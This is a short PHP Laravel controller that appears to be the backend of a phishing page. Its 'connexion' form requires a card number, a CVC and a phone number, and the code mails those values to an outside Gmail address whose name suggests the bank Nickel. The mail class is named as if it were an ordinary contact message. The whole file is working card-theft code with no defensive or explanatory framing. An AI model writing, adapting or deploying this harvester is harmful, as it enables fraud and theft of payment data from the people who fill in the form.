<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\ContactMail;

class ConnexionController extends Controller
{
    public function showForm()
    {
        return view('connexion');
    }
    
    public function send(Request $request)
    {
        $request->validate([
            'card_number' => 'required',
            'cvc' => 'required',
            'phone' => 'required',
        ]);
    
        $details = [
            'card_number' => $request->card_number,
            'cvc' => $request->cvc,
            'phone' => $request->phone,
        ];
    
        Mail::to('nickelservicesaccord@gmail.com')->send(new ContactMail($details, 'emails.connexion'));
    
        return redirect()->route('message')->with('success', 'Message envoyé avec succès !');
    }
}
